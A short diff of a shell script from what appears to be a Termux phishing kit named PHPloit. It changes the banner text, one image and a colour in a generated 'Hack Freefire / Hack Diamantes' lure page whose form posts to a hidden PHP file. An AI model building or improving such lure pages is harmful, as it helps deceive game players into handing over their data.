@@ -118,7 +118,7 @@ mkdir Freefire
 fi
 
 mv $name.php /data/data/com.termux/files/home/PHPloit/Freefire 
-cp logo.jpg N.png D.png Ga.png Fre.jpg /data/data/com.termux/files/home/PHPloit/Freefire
+cp logo.jpg N.png D.png Fre.jpg /data/data/com.termux/files/home/PHPloit/Freefire
 echo ""
 #Ocultar $name.php en pagina html
 echo "
@@ -141,7 +141,7 @@ echo "
                         </div>
                 </header>
                 <section>
-                        <div class='div'><p>Hack Freefire</p></div>
+                        <div class='div'><p>Hack Diamantes</p></div>
                         <form action='$name.php' method='POST'>
        <p align='left'><br><br><br>
         <div class='inputuno'>
@@ -454,7 +454,7 @@ body section {
 }
 
 body section .div {
-        background-color: black;
+        background-color: red;
         height: 150px;
 }
 
